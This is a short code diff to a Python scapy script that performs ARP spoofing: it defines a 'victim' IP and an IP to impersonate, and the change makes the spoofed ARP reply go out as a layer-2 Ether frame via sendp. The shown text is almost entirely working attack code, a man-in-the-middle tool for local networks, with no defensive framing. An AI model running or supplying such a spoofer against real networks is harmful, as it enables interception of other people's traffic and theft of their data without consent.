@@ -1,5 +1,5 @@
 import time
-from scapy.all import ARP, Ether, srp, send, conf, get_if_hwaddr
+from scapy.all import ARP, Ether, srp, send, conf, sendp
 
 # Define the target (victim) and the IP we want to impersonate.
 TARGET_IP = "192.168.1.10"      # Victim's IP address.
@@ -38,11 +38,11 @@ def spoof(target_ip, spoofed_ip):
         return
 
     # Create the ARP reply packet.
-    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)
+    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)
     # Optionally, set our source MAC explicitly:
     # packet.hwsrc = get_if_hwaddr(conf.iface)
     print(f"[DEBUG] Sending spoofed ARP reply: Telling {target_ip} that {spoofed_ip} is at our MAC.")
-    send(packet, verbose=False)
+    sendp(packet, verbose=False)
 
 def restore(destination_ip, source_ip):
     """
